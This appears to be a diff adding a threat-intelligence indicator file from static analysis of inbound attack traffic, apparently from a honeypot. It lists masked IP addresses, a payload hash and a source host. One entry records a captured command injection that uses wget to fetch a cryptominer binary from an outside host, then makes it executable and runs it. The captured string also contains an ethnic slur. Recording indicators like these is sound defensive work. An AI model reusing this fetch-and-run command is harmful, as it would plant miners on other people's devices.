@@ -1,0 +1,33 @@
+[
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "190.179.128.XXX"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "31.56.209.XXX"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "b56c539869fdf0eaae6831b7f05050b50f36e466d5a8bbec36600e0d17673a99"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\\/31.56.209.XXX/monero.arm7;chmod+777+monero.arm7;./monero.arm7+jews;wget+http:"
+  },
+  {
+    "asn": "Offshore LC",
+    "country": "Luxembourg",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "176.65.139.XXX"
+  }
+]
